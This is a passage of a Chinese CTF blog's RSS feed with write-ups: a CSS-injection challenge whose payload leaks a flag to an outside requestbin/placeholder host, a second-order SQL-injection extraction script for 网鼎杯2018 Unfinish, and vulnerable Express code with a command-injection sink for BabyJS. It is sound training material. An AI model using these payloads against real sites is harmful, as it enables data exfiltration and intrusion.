	&lt;a href=&#34;https://pic.imgdb.cn/item/6240218f27f86abb2a9131ad.png&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6240218f27f86abb2a9131ad.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://websec.readthedocs.io/zh/latest/vuln/xss/trick/cssi.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://websec.readthedocs.io/zh/latest/vuln/xss/trick/cssi.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;CSS注入，如果有机会写任意CSS，那么可以做到&lt;/p&gt;
&lt;p&gt;1.得到input栏里的token&lt;/p&gt;
&lt;p&gt;2.得到&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;里的token&lt;/p&gt;
&lt;p&gt;当然，题里用flag代替token&lt;/p&gt;
&lt;p&gt;我们这里使用CSS selectors完成攻击&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/*选择value值为abc的input标签*/
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;input[value=&amp;#34;abc&amp;#34;] { }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/*选择value值以a开头的input标签 */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;input[value^=&amp;#34;a&amp;#34;] { }
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;注入代码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;input[name=flag][value^=&amp;#34;b&amp;#34;] ~ * {background-image: url(&amp;#34;http://x.x.x.x/b&amp;#34;);}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;更换选择的值，选择到了就加载对应的background-image&lt;/p&gt;
&lt;p&gt;~ *简单理解为防止出现background-image不加载的情况&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;# encoding = utf-8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; string 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;from&lt;/span&gt; selenium &lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; webdriver	
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; time
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;url &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;http://df3ac406-f5d0-4459-af64-3ff82a3d9f39.node4.buuoj.cn:81/&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;driver &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;  driver&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;webdriver&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;Chrome(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;F:&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;chromedriver_win32&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;chromedriver.exe&amp;#34;&lt;/span&gt; )
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;flag &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;s &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; string&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;digits&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;string&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;ascii_letters&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;{&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;}&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;_&amp;#39;&lt;/span&gt;   &lt;span style=&#34;color:#6272a4&#34;&gt;#可见字符&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; s:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        flag &lt;span style=&#34;color:#ff79c6&#34;&gt;+=&lt;/span&gt; i
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        string &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;input[name=flag][value^=&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;] ~ * {background-image: url(&amp;#34;http://http.requestbin.buuoj.cn/1q89at51/&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;);}&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;%&lt;/span&gt;(flag, flag)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        data &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;css&amp;#34;&lt;/span&gt;: string}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        driver&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;get(url)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        css &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; driver&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;find_element_by_name(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;css&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        css&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;send_keys(string)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        driver&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;find_element_by_xpath(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;//input[@type=&amp;#39;submit&amp;#39;]&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;click()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        flag&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;麻了，这个脚本跑多了靶机就没反应了，然后就要重启靶机……神奇&lt;/p&gt;
</description>
        </item>
        <item>
        <title>[网鼎杯2018]Unfinish</title>
        <link>https://proben1.github.io/2021/%E7%BD%91%E9%BC%8E%E6%9D%AF2018unfinish/</link>
        <pubDate>Mon, 22 Nov 2021 16:37:25 +0800</pubDate>
        
        <guid>https://proben1.github.io/2021/%E7%BD%91%E9%BC%8E%E6%9D%AF2018unfinish/</guid>
        <description>&lt;h2 id=&#34;网鼎杯2018unfinish&#34;&gt;[网鼎杯2018]Unfinish&lt;/h2&gt;
&lt;p&gt;二次注入，注入点是在register.php传入的username中。&lt;/p&gt;
&lt;p&gt;1.猜测语句&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;insert&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;table&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;values&lt;/span&gt; (&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;email&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;2.表名是猜的&lt;/p&gt;
&lt;p&gt;过滤了information&lt;/p&gt;
&lt;p&gt;mysql版本是&lt;strong&gt;5.5.64&lt;/strong&gt;，sys 库在&lt;strong&gt;MySQL5.6&lt;/strong&gt;或更高版本才有。&lt;/p&gt;
&lt;p&gt;3.每次都需要注意换邮箱&lt;/p&gt;
&lt;p&gt;4.过滤了逗号，不能闭合。&lt;/p&gt;
&lt;p&gt;要用from for&lt;/p&gt;
&lt;p&gt;5.+如果被识别成空格，可以用%2B。
用异或也可以实现&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; requests
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;from&lt;/span&gt; bs4 &lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; BeautifulSoup
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; re
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;url &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;http://3facbb99-4fb4-44fa-8fae-fa28575f788a.node4.buuoj.cn:81/&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#ff79c6&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;60&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    email &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;eqwews1@131416024w&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;str&lt;/span&gt;(i)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#6272a4&#34;&gt;#insert table values (&amp;#39;email&amp;#39;,&amp;#39;username&amp;#39;,&amp;#39;password&amp;#39;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    payload &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;0&amp;#39; + ascii(substr((select * from flag) from &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;str&lt;/span&gt;(i)&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34; for 1))+&amp;#39;0&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    register &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;email&amp;#39;&lt;/span&gt;:email,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt;:payload,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    login &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;email&amp;#39;&lt;/span&gt;:email,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    r1 &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;post(url&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;register.php&amp;#39;&lt;/span&gt;,data &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; register)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    r2 &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;post(url&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;login.php&amp;#39;&lt;/span&gt;, data &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; login,allow_redirects&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;True&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    soup &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; BeautifulSoup(r2&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;text,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;html.parser&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    a&lt;span style=&#34;color:#ff79c6&#34;&gt;+=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;chr&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;int&lt;/span&gt;(soup&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;span&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;string&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;strip()))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(a)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;#print(soup.find_all(&amp;#39;span&amp;#39;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;#print(re.findall(&amp;#34;.*?&amp;lt;/span&amp;gt;&amp;#34;,r2.text)[0].replace(&amp;#39;&amp;lt;/span&amp;gt;&amp;#39;,&amp;#39;&amp;#39;).strip(),end=&amp;#39;&amp;#39;) 不用bs4用re硬找&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;heading&#34;&gt;&lt;/h2&gt;
</description>
        </item>
        <item>
        <title>[网鼎杯2020半决赛]BabyJS</title>
        <link>https://proben1.github.io/2021/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E5%8D%8A%E5%86%B3%E8%B5%9Bbabyjs/</link>
        <pubDate>Mon, 22 Nov 2021 16:37:25 +0800</pubDate>
        
        <guid>https://proben1.github.io/2021/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E5%8D%8A%E5%86%B3%E8%B5%9Bbabyjs/</guid>
        <description>&lt;p&gt;快速拔刀（不是）&lt;/p&gt;
&lt;p&gt;快速找到关键源码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;var&lt;/span&gt; express &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; require(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;express&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;var&lt;/span&gt; config &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; require(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;../config&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;var&lt;/span&gt; url&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;require(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;url&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;var&lt;/span&gt; child_process&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;require(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;child_process&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;var&lt;/span&gt; fs&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;require(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;fs&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;var&lt;/span&gt; request&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;require(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;request&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;var&lt;/span&gt; router &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; express.Router();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;var&lt;/span&gt; blacklist&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;127.0.0.1.xip.io&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;::ffff:127.0.0.1&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;0.0.0.0&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;[::1]&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;::1&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;router.get(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;function&lt;/span&gt;(req, res, next) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    res.json({});
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;});
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;router.get(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;/debug&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;function&lt;/span&gt;(req, res, next) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    console.log(req.ip);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt;(blacklist.indexOf(req.ip)&lt;span style=&#34;color:#ff79c6&#34;&gt;!=-&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;){
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        console.log(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;res&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;var&lt;/span&gt; u&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;req.query.url.replace(&lt;span style=&#34;color:#f1fa8c&#34;&gt;/[\&amp;#34;\&amp;#39;]/ig&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	console.log(url.parse(u).href);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;let&lt;/span&gt; log&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;`echo  &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;${&lt;/span&gt;url.parse(u).href&lt;span style=&#34;color:#f1fa8c&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;gt;&amp;gt;/tmp/log`&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	console.log(log);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	child_process.exec(log);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	res.json({data&lt;span style=&#34;color:#ff79c6&#34;&gt;:&lt;/span&gt;fs.readFileSync(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;/tmp/log&amp;#39;&lt;/span&gt;).toString()});
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }&lt;span style=&#34;color:#ff79c6&#34;&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        res.json({});
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;});
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
